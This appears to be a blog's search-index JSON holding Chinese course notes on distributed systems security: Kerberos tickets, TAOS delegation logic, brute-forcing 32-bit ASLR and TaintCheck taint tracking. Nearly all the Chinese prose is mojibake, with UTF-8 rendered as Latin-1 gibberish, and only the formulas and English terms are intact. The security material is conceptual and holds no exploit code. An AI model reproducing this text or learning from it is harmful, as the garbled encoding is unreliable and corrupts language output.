timestamp æ—¶é—´æˆ³ ttl ticket æœ‰æ•ˆæ—¶é•¿ $K_{s,c}$ s å’Œ c çš„ session key $K_s$ s çš„å¯†é’¥ $\\{abc\\}K$ ç”¨ $K$ åŠ å¯† $abc$ å¾—åˆ°çš„å¯†æ–‡ ticket é¢å‘åèƒ½è¢«ç”¨å¤šæ¬¡ï¼Œä½† authenticator åªèƒ½ç”¨ä¸€æ¬¡ï¼›ticket ç”±æœåŠ¡å™¨ç”Ÿæˆï¼Œè€Œ authenticator ç”±å®¢æˆ·ç«¯ç”Ÿæˆã€‚ä¸€ä¸ª authenticator é€šå¸¸é•¿è¿™æ ·ï¼š $$ \\{c,addr,timestamp\\}K_{s,c} $$ è·å– TGS ticket æœ€åˆï¼Œç”¨æˆ·åªèƒ½é€šè¿‡å¯†ç æ¥è¯æ˜èº«ä»½ã€‚å› æ­¤ç”¨æˆ·é¦–å…ˆè¦è¾“å…¥ç”¨æˆ·åï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å‘ Kerberos ç³»ç»Ÿå‘é€ï¼š $$ c,tgs $$ ç¬¦å· å«ä¹‰ tgs ticket-granting æœåŠ¡å™¨ï¼ˆçš„åç§°ï¼‰ è¡¨ç¤ºæƒ³è¦ä½¿ç”¨ ticket-granting æœåŠ¡å™¨ä¸Šçš„æœåŠ¡ã€‚Kerberos ç³»ç»Ÿæ£€æŸ¥ c åç”Ÿæˆ c å’Œ tgs çš„ session keyã€‚éšåå›å¤ï¼š $$ \\{\\ K_{c,tgs},\\{T_{c,tgs}\\}K_{tgs}\\ \\}K_c $$ ç¬¦å· å«ä¹‰ $T_{c,tgs}$ c ä½¿ç”¨ tgs æœåŠ¡çš„ ticket ç”¨æˆ·æ”¶åˆ°åï¼Œè¾“å…¥å¯†ç ã€‚æ­¤æ—¶å¯†ç è¢«è½¬åŒ–ä¸ºå¯†é’¥å¹¶è§£å¯†è¿™ä¸ªæ¶ˆæ¯ã€‚è¿™æ ·ï¼Œç”¨æˆ·å°±å¯ä»¥è®¿é—® tgs äº†ã€‚ è·å–æœåŠ¡ ticket å¦‚æœç”¨æˆ·è¿˜æ²¡æœ‰è·å–è¿‡è¿™ä¸ªæœåŠ¡çš„ ticket æˆ–è€… ticket å·²ç»è¿‡æœŸäº†ï¼Œé‚£ä¹ˆå°±éœ€è¦ä» tgs é‚£é‡Œè·å–æœåŠ¡ ticketã€‚å®¢æˆ·ç«¯å‘ tgs å‘é€ï¼š $$ s,\\{T_{c,tgs}\\}K_{tgs},\\{A_c\\}K_{c,tgs} $$ ç¬¦å· å«ä¹‰ $A_c$ c çš„ authenticator tgs éšåè§£å¯†å¹¶æ£€æŸ¥ ticket å’Œ authenticatorï¼Œå¹¶ç”Ÿæˆ c å’Œ s çš„ session keyã€‚éšåå›å¤ï¼š $$ \\{\\ \\{T_{c,s}\\}K_s,K_{c,s}\\ \\}K_{c,tgs} $$ ç”¨æˆ·æ”¶åˆ°åï¼Œä¸éœ€è¦å†æ¬¡è¾“å…¥å¯†ç å°±å¯ä»¥è‡ªåŠ¨ä½¿ç”¨ $K_{c,tgs}$ è§£å¯†æ¶ˆæ¯ï¼Œè·å¾— c ä½¿ç”¨ s æœåŠ¡çš„ ticketã€‚è¿™æ ·ï¼Œç”¨æˆ·å°±å¯ä»¥è®¿é—® s äº†ã€‚ è®¿é—®æœåŠ¡ å®¢æˆ·ç«¯å‘ s å‘é€ï¼š $$ \\{A_c\\}K_{c,s},\\{T_{c,s}\\}K_s $$ s éšåè§£å¯†å¹¶æ£€æŸ¥ ticket å’Œ authenticatorï¼Œå¦‚æœåˆæ³•åˆ™è®¤è¯æˆåŠŸï¼Œå¼€å§‹æä¾›æœåŠ¡ã€‚ä¸ºäº†é˜²æ­¢é‡æ”¾æ”»å‡»ï¼ŒæœåŠ¡å™¨ä¼šä¸¢å¼ƒ timestamp æ¥è‡ªæœªæ¥çš„ã€æˆ–è€…å’Œå·²æ¥æ”¶ timestamp é‡å¤çš„é‚£äº›è¯·æ±‚ã€‚ æœ€åï¼Œå¦‚æœå®¢æˆ·ç«¯ä¹Ÿéœ€è¦æœåŠ¡å™¨è¯æ˜èº«ä»½ï¼Œs åªéœ€è¦å›å¤ï¼š $$ \\{timestamp+1\\}K_{c,s} $$ å›¾ 4ï½œKerberos è®¤è¯è¿‡ç¨‹ \" å›¾ 4ï½œKerberos è®¤è¯è¿‡ç¨‹ ","date":"2021-10-18","objectID":"/distributed-systems/:11:4","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"å±€é™æ€§ è¦æ±‚ç³»ç»Ÿä¸­æ‰€æœ‰ç³»ç»Ÿæ—¶é’ŸåŒæ­¥ ä¸­å¿ƒåŒ–å­˜å‚¨æ•æ„Ÿä¿¡æ¯ï¼Œå®¹æ˜“å•ç‚¹æ•…éšœ éš¾ä»¥æ›´æ”¹å¯†ç ã€å‡çº§å¯†é’¥æ•°æ®åº“ authenticator é»˜è®¤ 5 åˆ†é’Ÿåè¿‡æœŸï¼Œä¾ç„¶å­˜åœ¨é‡æ”¾æ”»å‡»å¯èƒ½ ticket è¿‡æœŸæœºåˆ¶å¯¼è‡´æ— æ³•é•¿æ—¶é—´è¿è¡Œåå°ä»»åŠ¡ ","date":"2021-10-18","objectID":"/distributed-systems/:11:5","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"TAOS åœ¨è®² TAOS å‰è®²äº†å…³äº SSL/TLS åè®®çš„çŸ¥è¯†ï¼Œå› ä¸ºå·²ç»æ¯”è¾ƒç†Ÿæ‚‰äº†ï¼Œä¹Ÿæ²¡ä»€ä¹ˆè®°å½•çš„å¿…è¦ã€‚ TAOS çš„è®ºæ–‡ä¸­æä¾›äº†ä¸€ç§åŸºäºå…¬é’¥å¯†ç ä½“åˆ¶å’Œè¯ä¹¦çš„åˆ†å¸ƒå¼è®¤è¯åè®®ï¼Œä»¥åŠå¯¹åº”çš„å½¢å¼åŒ–çš„ç†è®ºåŸºç¡€ã€‚å…¶æœ€é‡è¦çš„è´¡çŒ®æ˜¯è§£å†³äº†è®¤è¯å§”æ‰˜çš„é—®é¢˜ï¼Œè¿™æ˜¯ä¸“æ³¨äºä¸¤æ–¹è®¤è¯çš„ SSL/TLS æ‰€ä¸èƒ½æ”¯æŒçš„ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:12:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ç¬¦å· $A\\ says\\ S$ï¼šè¡¨ç¤ºä¸»ä½“ $A$ æ”¯æŒå£°æ˜ $S$ $A\\Rightarrow B$ æˆ– $A\\ speaks\\ for\\ B$ï¼šè¡¨ç¤ºä¸»ä½“ $A$ å‘å¸ƒçš„ä»»æ„å£°æ˜éƒ½å¯ä»¥è®¤ä¸ºæ˜¯ $B$ å‘å¸ƒçš„ ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœ $A\\Rightarrow B$ ä¸” $A\\ says\\ S$ï¼Œé‚£ä¹ˆ $B\\ says\\ S$ è¿™é‡Œçš„ä¸»ä½“åŒ…æ‹¬ï¼š ç®€å•ä¸»ä½“ï¼šå¦‚ç”¨æˆ·å’Œæœºå™¨ç­‰ã€‚ ä¿¡é“ï¼šæŒ‡ç½‘ç»œåœ°å€å’ŒåŠ å¯†å¯†é’¥ã€‚å¦‚æœå£°æ˜ $S$ å‡ºç°åœ¨äº†ä¿¡é“ $C$ ä¸Šï¼Œé‚£ä¹ˆ $C\\ says\\ S$ï¼›å¦‚æœç”¨ $K$ ç­¾åä¸€å¼ åŒ…å« $S$ çš„è¯ä¹¦ï¼Œé‚£ä¹ˆ $K\\ says\\ S$ã€‚éœ€è¦æ³¨æ„ï¼Œåªæœ‰ä¿¡é“å¯ä»¥ç›´æ¥å‘å¸ƒä¸€ä¸ªå£°æ˜ï¼Œå› ä¸ºå£°æ˜åªèƒ½å‡ºç°åœ¨ä¿¡é“ä¸Šã€‚ ç»„ï¼šä¸€ç»„ä¸»ä½“ã€‚å¦‚æœ $A$ åœ¨ç»„ $G$ ä¸­ï¼Œé‚£ä¹ˆ $A\\Rightarrow G$ã€‚ ä»£è¡¨æŸä¸€è§’è‰²çš„ä¸»ä½“ï¼šä¾‹å¦‚ $Bob$ ä»¥ $Admin$ çš„èº«ä»½æ‰§è¡Œæ“ä½œæ—¶ï¼Œæˆ‘ä»¬è¯´ $Bob\\ as\\ Admin$ã€‚æ­¤æ—¶ $Bob\\Rightarrow (Bob\\ as\\ Admin)$ã€‚ ä¸»ä½“çš„é€»è¾‘ä¸ã€‚ å¼•ç”¨æŸä¸€ä¸»ä½“çš„ä¸»ä½“ï¼šæˆ‘ä»¬ç”¨ $B|A$ è¡¨ç¤º $B$ å¼•ç”¨äº† $A$ï¼Œå³ $B\\ says\\ A\\ says\\ S$ ç­‰äº $(B|A)\\ says\\ S$ã€‚ ä»£è¡¨æŸä¸€ä¸»ä½“çš„ä¸»ä½“ï¼šæˆ‘ä»¬ç”¨ $B\\ for\\ A$ è¡¨ç¤º $B$ ä»£è¡¨äº† $A$ï¼Œè¿™æ¯” $B|A$ æ›´å¼ºï¼Œå› ä¸ºæ­¤æ—¶ $B$ å·²ç»è·å¾—äº† $A$ çš„æˆæƒã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:12:1","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"å…¬ç† handoff å…¬ç†ï¼šå¦‚æœ $A\\ says\\ (B\\Rightarrow A)$ï¼Œé‚£ä¹ˆ $B\\Rightarrow A$ã€‚ delegation å…¬ç†ï¼šå¦‚æœ $A\\ says\\ ((B|A)\\Rightarrow (B\\ for\\ A))$ï¼Œé‚£ä¹ˆ $(B|A)\\Rightarrow (B\\ for\\ A)$ã€‚ æ³¨æ„åˆ° delegation å’Œ handoff çœ‹èµ·æ¥å·®ä¸å¤šï¼Œä½†é‡è¦çš„æ˜¯åœ¨ delegation ä¸­é¢å¤–è®°å½•äº†è¢«æˆæƒçš„ä¸»ä½“ $B$ã€‚å¦‚æœ $B$ å‘å¸ƒçš„å£°æ˜å‡ºç°äº†é—®é¢˜ï¼Œè¿™ä¸€ç‰¹æ€§ç»“åˆæ—¥å¿—å®¡è®¡ä½¿å¾—æˆ‘ä»¬ä¸å¿…å†å‘å¾ˆå¯èƒ½æ˜¯æ— è¾œçš„ $A$ è¿½è´£ï¼Œè€Œæ˜¯ç›´æ¥å‘ $B$ è¿½è´£ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:12:2","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ğŸŒ° è®¤è¯å¤åˆä¸»ä½“ ä¸€å°æœºå™¨ $Vax4$ è¿è¡Œäº†æ“ä½œç³»ç»Ÿ $OS$ï¼Œä¸¤è€…å½¢æˆäº†ä¸€ä¸ªèŠ‚ç‚¹ $WS$ã€‚ç”¨æˆ· $Bob$ ç™»é™†äº† $WS$ï¼Œç°åœ¨éœ€è¦å‘è¿œç¨‹æ–‡ä»¶æœåŠ¡å™¨ $FS$ å‘é€è®¤è¯è¯·æ±‚ã€‚ä¸ºæ­¤ï¼Œ$Vax4$ å¿…é¡»æœ‰è‡ªå·±çš„å¯†é’¥å¯¹ï¼Œä¸å¦¨ä»¤å…¶å…¬é’¥ä¸º $K_{vax4}$ï¼Œç§é’¥ä¸º $K_{vax4}^{-1}$ï¼Œå…¶ä¸­ç§é’¥ä»…ä»…å¯¹ $Vax4$ çš„å¯åŠ¨å›ºä»¶å¯è§ï¼Œå¯¹ $OS$ æ˜¯ä¸å¯è§çš„ã€‚ $Vax4$ å¯åŠ¨æ—¶ï¼Œç”¨ç§é’¥ç­¾åä¸€ä¸ªå¯åŠ¨è¯ä¹¦ï¼Œå°†æƒé™ç§»äº¤ç»™æ–°ç”Ÿæˆçš„èŠ‚ç‚¹å…¬é’¥ $K_{ws}$ã€‚è¿™ä¸ªè¯ä¹¦å¯ä»¥è¡¨ç¤ºä¸ºï¼š $$ (K_{vax4}\\ as\\ OS)\\ says\\ (K_{ws}\\Rightarrow(K_{vax4}\\ as\\ OS))\\tag{1} $$ ä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨ $K_{vax4}$ï¼Ÿ ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¸å¸Œæœ›æœºå™¨ç§é’¥è¢«çªƒå–ï¼›å¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿä¸å¸Œæœ›è¿™äº›æ¶‰åŠçš„å£°æ˜åœ¨æœºå™¨é‡å¯åä¾ç„¶æœ‰æ•ˆã€‚ é‚£ä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨ $K_{ws}$ ä½œä¸ºæœºå™¨çš„æ ‡è¯†ï¼Ÿ å› ä¸ºæˆ‘ä»¬å¸Œæœ›æœºå™¨çš„æ ‡è¯†åœ¨é‡å¯åä¾ç„¶æœ‰æ•ˆã€‚ æ‰€ä»¥åˆ°åº•ä¸ºä»€ä¹ˆéœ€è¦æœºå™¨çš„æ ‡è¯†ï¼Ÿ å› ä¸ºæˆ‘ä»¬å¸Œæœ› $Bob$ èƒ½å°†æƒé™å§”æ‰˜ç»™ç‰¹å®šçš„æœºå™¨ã€‚ å› æ­¤ï¼Œå¯åŠ¨å $WS$ è·å¾—äº†å¯åŠ¨è¯ä¹¦ã€èŠ‚ç‚¹ç§é’¥ $K_{ws}^{-1}$ï¼Œä½†æ— æ³•çŸ¥é“ $K_{vax4}^{-1}$ã€‚ ç™»é™†æ“ä½œå¯ä»¥çœ‹ä½œä¸€ç§ç‰¹æ®Šçš„ delegationã€‚$Bob$ ç™»é™†æ—¶ï¼Œç”¨è‡ªå·±çš„ç§é’¥ $K_{bob}^{-1}$ ç­¾åä¸€ä¸ª delegation è¯ä¹¦ï¼Œå°†æƒé™å§”æ‰˜ç»™ $WS$ï¼š $$ K_{bob}\\ says\\ ((K_{ws}|K_{bob})\\Rightarrow(K_{ws}\\ for\\ K_{bob}))\\tag{2} $$ ç°åœ¨ï¼Œéœ€è¦å‘ $FS$ å‘é€è¯·æ±‚ã€‚é¦–å…ˆéœ€è¦ä¸€ä¸ªå‘é€è¯·æ±‚çš„ä¿¡é“ $C_{bob}$ï¼Œä»¥åŠè¯·æ±‚æœ¬èº« $RQ$ã€‚å‘é€è¯·æ±‚å¯ä»¥å†™ä½œï¼š $$ C_{bob}\\ says\\ RQ\\tag{3} $$ å¹¶ä¸”ï¼Œ$WS$ éœ€è¦ç­¾åä¸€ä¸ªä¿¡é“è¯ä¹¦ï¼Œå°†æƒé™ç§»äº¤ç»™ä¿¡é“ï¼š $$ (K_{ws}|K_{bob})\\ says\\ (C_{bob}\\Rightarrow(K_{ws}|K_{bob}))\\tag{4} $$ ç»“åˆ (4) å’Œ (2)ï¼Œä½¿ç”¨ delegationï¼Œ$FS$ å¯ä»¥æ¨å‡ºï¼š $$ (K_{ws}\\ for\\ K_{bob})\\ says\\ (C_{bob}\\Rightarrow(K_{ws}\\ for\\ K_{bob}))\\tag{5} $$ ç»“åˆ (5) å’Œ (3)ï¼Œä½¿ç”¨ handoffï¼Œ$FS$ å¯ä»¥æ¨å‡ºï¼š $$ (K_{ws}\\ for\\ K_{bob})\\ says\\ RQ\\tag{6} $$ ç»“åˆ (6) å’Œ (1)ï¼Œä½¿ç”¨ handoffï¼Œ$FS$ å¯ä»¥æ¨å‡ºï¼š $$ ((K_{vax4}\\ as\\ OS)\\ for\\ K_{bob})\\ says\\ RQ\\tag{7} $$ æœ€åï¼Œ$FS$ è¿˜éœ€è¦è¯æ˜ $K_{vax4}$ å’Œ $K_{bob}$ ç¡®å®ä»£è¡¨äº† $Vax4$ å’Œ $Bob$ã€‚ä¸ºæ­¤ï¼Œå¿…é¡»å¼•å…¥å—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹æœºæ„ $CA$ï¼Œä¹Ÿå°±æ˜¯è¯´ç›¸ä¿¡ $K_{ca}\\Rightarrow$ ä»»æ„çš„ä¸»ä½“ã€‚å› æ­¤ï¼Œ$FS$ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹è¯ä¹¦ï¼š $$ K_{ca}\\ says\\ (K_{vax4}\\Rightarrow Vax4) $$ $$ K_{ca}\\ says\\ (K_{bob}\\Rightarrow Bob) $$ ç»“åˆ (7)ï¼Œä½¿ç”¨ handoffï¼Œæœ€ç»ˆå¾—åˆ°ï¼š $$ ((Vax4\\ as\\ OS)\\ for\\ Bob)\\ says\\ RQ $$ å…¶è¯­ä¹‰æ˜¯ï¼š$FS$ å¾—çŸ¥è¿è¡Œç€ $OS$ çš„æœºå™¨ $Vax4$ ä»£è¡¨ç”¨æˆ· $Bob$ å‘é€äº†è¯·æ±‚ $RQ$ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:12:3","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ASLR åœ¨è®² ASLR å‰è®²äº†å…³äºæ ˆæº¢å‡ºæ¼æ´å’Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨ï¼Œå› ä¸ºå·²ç»æ¯”è¾ƒç†Ÿæ‚‰äº†ï¼Œä¹Ÿæ²¡ä»€ä¹ˆè®°å½•çš„å¿…è¦ã€‚ åœ¨ Ret2Shellcodeã€Ret2Libc ç­‰æ”»å‡»ä¸­ï¼Œä¸€ä¸ªå¿…è¦çš„æ¡ä»¶æ˜¯æ”»å‡»è€…å¿…é¡»çŸ¥é“æ ˆåœ°å€ã€ libc åŸºåœ°å€ã€å†™å…¥çš„å­—ç¬¦ä¸²åœ°å€ç­‰ç­‰ã€‚ASLR å°è¯•éšæœºåŒ–è¿›ç¨‹çš„åœ°å€ç©ºé—´æ¥é˜»æ­¢è¿™äº›åˆ©ç”¨ï¼Œä½¿å¾—ç¨‹åºç›´æ¥å´©æºƒã€‚ä¸»è¦éšæœºåŒ–çš„å†…å­˜åŒºåŸŸåŒ…æ‹¬ï¼š å¯æ‰§è¡ŒåŒºåŸŸï¼Œå¦‚ text æ®µç­‰ï¼ŒéšæœºåŒ– 16 bits mapped åŒºåŸŸï¼Œå¦‚å †ã€åŠ¨æ€é“¾æ¥åº“ç­‰ï¼ŒéšæœºåŒ– 16 bits æ ˆåŒºåŸŸï¼ŒéšæœºåŒ– 24 bits mapped åŒºåŸŸåªèƒ½éšæœºåŒ– 16 bitsï¼Œå› ä¸ºç¬¬ 28-31 bits å¦‚æœéšæœºï¼Œä¼šå½±å“ mmap() ç”³è¯·å¤§å—å†…å­˜ï¼›0-11 bits å¦‚æœéšæœºï¼Œä¼šå½±å“ mmap() ç”³è¯·åˆ°çš„é¡µçš„å¯¹é½ã€‚ ç”±äº 16 bits å¹¶ä¸å¤šï¼ŒASLR çš„éšæœºåŒ–æ˜¯å¯ä»¥è¢«æš´åŠ›çŒœè§£çš„ã€‚åœ¨æ”»å‡» ASLR çš„è®ºæ–‡ä¸­ä½¿ç”¨äº†çŒœæµ‹çš„ usleep() åœ°å€è¦†ç›–è¿”å›åœ°å€ã€‚è¿™æ ·ï¼Œå¦‚æœçŒœå¯¹äº†ï¼Œå°±ä¼šäº§ç”Ÿéå¸¸æ˜æ˜¾çš„å»¶è¿Ÿï¼›è€Œå¦‚æœçŒœé”™äº†ï¼Œç¨‹åºä¼šç«‹å³å´©æºƒã€‚æˆåŠŸçŒœåˆ°éšæœºåç§»åï¼Œå°±æ˜¯æ­£å¸¸çš„ Ret2Libc æµç¨‹äº†ã€‚ è¿™é‡Œä¼ å…¥ç»™ usleep() çš„å‚æ•°æ˜¯ 0x01010101ï¼Œä¹Ÿå°±æ˜¯æœ€å°çš„ä¸åŒ…æ‹¬ 0x00 å­—èŠ‚çš„æ•°å­—ï¼Œå¤§çº¦ç­‰äº 16 ç§’ã€‚ è¿™ç§æš´åŠ›æ”»å‡»å¹³å‡åªéœ€è¦ 216 ç§’å’Œ 6.4 MB æµé‡ï¼Œéå¸¸é«˜æ•ˆã€‚å³ä½¿æ¯æ¬¡å´©æºƒåé‡æ–°éšæœºåŒ–åœ°å€ç©ºé—´ï¼Œéœ€è¦çš„å°è¯•æ¬¡æ•°ä¹Ÿåªä¼šå˜ä¸ºåŸæ¥çš„ 2 å€ï¼Œå½±å“ä¸å¤§ã€‚å½“ç„¶ï¼Œé˜²å¾¡æ–¹å¼ä¹Ÿéå¸¸ç®€å•ï¼Œå‡çº§åˆ° 64 ä½ç³»ç»Ÿå³å¯ï¼Œæ­¤æ—¶éšæœºåŒ–çš„ bits è‡³å°‘èƒ½è¾¾åˆ° 40 ä¸ªï¼ˆç„¶è€Œï¼Œ64 ä½ ASLR åŒæ ·æœ‰ä¸åŒçš„æ”»å‡»æ–¹å¼ï¼‰ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:13:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"TaintCheck TaintCheck åˆ™æä¾›äº†ä¸€ç§æ— éœ€æºç ï¼Œç›´æ¥ä½œç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶çš„æ¼æ´åˆ©ç”¨æ£€æµ‹æ–¹å¼ï¼Œå¹¶ä¸”è¿™ç§æ–¹å¼æå°‘äº§ç”Ÿå‡é˜³æ€§ç»“æœï¼Œè¿˜èƒ½è¿½è¸ªæ¼æ´åˆ©ç”¨çš„æ•°æ®æµã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œå¤§å¤šæ•°æ¼æ´åˆ©ç”¨éƒ½éœ€è¦ä¿®æ”¹ç¨‹åºçš„æ§åˆ¶æµï¼Œè¿™å°±éœ€è¦æ§åˆ¶ç±»ä¼¼äºè¿”å›åœ°å€ã€å…³é”®å‚æ•°ä¹‹ç±»çš„å€¼ã€‚TaintCheck æ‰€åšçš„äº‹å°±æ˜¯ç»™ç”¨æˆ·è¾“å…¥çš„æ•°æ®æ ‡è®°ä¸€ä¸ªæ±¡ç‚¹ï¼Œå¦‚æœè¿™äº›æ•°æ®è¢«å¤åˆ¶æˆ–è€…è¢«ç”¨äºäº§ç”Ÿæ–°çš„æ•°æ®ï¼Œé‚£ä¹ˆæ–°çš„æ•°æ®ä¹Ÿä¼šè¢«æ ‡è®°ä¸Šæ±¡ç‚¹ã€‚è¿™æ ·ï¼Œå¦‚æœæœ€ç»ˆå‘ç°ä¸€äº›æ§åˆ¶æ•°æ®ï¼ˆå¦‚è¿”å›åœ°å€ï¼‰ä¸Šå­˜åœ¨æ±¡ç‚¹ï¼Œç«‹åˆ»ä¸­æ­¢ç¨‹åºå¹¶å¯ä»¥ç¡®è®¤é­å—äº†æ”»å‡»ã€‚ ä¸ºäº†ç›´æ¥ä½œç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒTaintCheck ä½¿ç”¨ Valgrind æ¥å°†ç¨‹åºçš„æŒ‡ä»¤ç¿»è¯‘æˆ UCodeï¼Œéšåæ’å…¥ç”¨äºæ ‡è®°æ±¡ç‚¹çš„ä»£ç ï¼Œå¹¶å°† UCode ç¿»è¯‘å›å»ã€‚è¿™ä¸ªè¿‡ç¨‹æ˜¯é’ˆå¯¹æ¯ä¸ªåŸºæœ¬å—æ‰§è¡Œçš„ï¼Œå› æ­¤åœ¨ jmp / ret / call ç­‰æŒ‡ä»¤å‰éƒ½ä¼šæ£€æŸ¥è¦è·³è½¬çš„åœ°å€æ˜¯å¦æœ‰æ±¡ç‚¹ã€‚ å¯¹å­˜åœ¨æ±¡ç‚¹çš„å†…å­˜åŒºåŸŸï¼ŒTaintCheck ç»´æŠ¤äº†ä¸€ä»½ shadow memory æ¥è®°å½•æ±¡ç‚¹çŠ¶æ€ã€‚Fast æ¨¡å¼ä¸‹ï¼Œå¯¹äºæ¯ä¸ªå†…å­˜ä¸­çš„å­—èŠ‚åªä½¿ç”¨ 1 bit æ¥è®°å½•æ˜¯å¦æœ‰æ±¡ç‚¹ï¼›Detailed æ¨¡å¼ä¸‹ï¼Œåˆ™ä½¿ç”¨ 4 å­—èŠ‚çš„æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªæ±¡ç‚¹çš„ç»“æ„ä½“ï¼Œè®°å½•äº†è¯¦ç»†çš„ syscallã€æ ˆ ç­‰ä¿¡æ¯ï¼Œç”¨äºè¿½è¸ªæ¼æ´åˆ©ç”¨æ•°æ®æµã€‚ ä¸è¿‡ï¼ŒTaintCheck å¹¶ä¸ä¼šä¸º condition flags åŠ æ±¡ç‚¹ï¼Œå³ä½¿å®ƒä¼šç›´æ¥æ”¶åˆ°ç”¨æˆ·è¾“å…¥å½±å“ã€‚è¿™ä¹ˆåšæ˜¯å› ä¸ºè¿™ä¼šæå¤§æé«˜å‡é˜³æ€§ç‡ï¼Œä½†è¿™æ ·åšä¹Ÿå¯¼è‡´äº†ä¸€äº›å‡é˜´æ€§çš„æƒ…å†µå‡ºç°ï¼Œä¾‹å¦‚ï¼š if (x == 0) y = 0; else y = 1; å¦‚æœ x æ˜¯ç”¨æˆ·è¾“å…¥ï¼Œé‚£ä¹ˆè¿™é‡Œçš„ y å®é™…ä¸Šæ˜¯å’Œ x ä¸€è‡´çš„ï¼Œç„¶è€Œ y å´ä¸ä¼šè¢«æ ‡è®°ã€‚å¦‚æœæ”»å‡»è€…çŸ¥é“è¿™ä¸€ç‚¹ï¼Œå°±å¯ä»¥ç”¨ y æ¥ä¿®æ”¹æ§åˆ¶æ•°æ®åŒæ—¶ç»•è¿‡æ£€æµ‹ã€‚è¿™ä¸ªä¾‹å­æ¯”è¾ƒæç«¯ï¼Œä½†ç¡®å®å±•ç¤ºäº†å‡é˜´æ€§çš„å¯èƒ½æ€§ã€‚ æ­¤å¤–ï¼ŒTaintCheck æ€§èƒ½å ªå¿§ï¼Œåœ¨æœåŠ¡å™¨è¿”å›æ•°æ®è¾ƒå°‘æ—¶ï¼Œå“åº”æ—¶é—´ç”šè‡³å¯ä»¥è¾¾åˆ°åŸæ¥çš„ 20 - 30 å€ã€‚è¿™è¦éƒ¨åˆ†å½’åŠŸäº Valgrindï¼Œæ¯•ç«Ÿåªè·‘ Valgrind å°±ä¼šæ…¢ 5 å€å·¦å³äº†ã€‚ä½†å°±ç»“æœè€Œè¨€ï¼Œè¿™è®© TaintCheck éš¾ä»¥éƒ¨ç½²åˆ°ç”Ÿäº§æœåŠ¡å™¨ä¸Šï¼Œæ›´å¤šæƒ…å†µä¸‹æ›´é€‚åˆåœ¨æ—è·¯è¿›è¡Œæµé‡é‡‡æ ·ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:14:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"SFI æˆ‘ä»¬ç»å¸¸ä¼šä½¿ç”¨ä¸€äº›é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶åŒ…ï¼Œæ¯”å¦‚æµè§ˆå™¨æ’ä»¶ã€å†…æ ¸æ’ä»¶ç­‰ç­‰ï¼Œè¿™äº›åŒ…æœ‰æ—¶å€™æ¥è‡ªäºä¸å—ä¿¡ä»»çš„æ¥æºï¼Œä½†æ˜¯å´åŠ 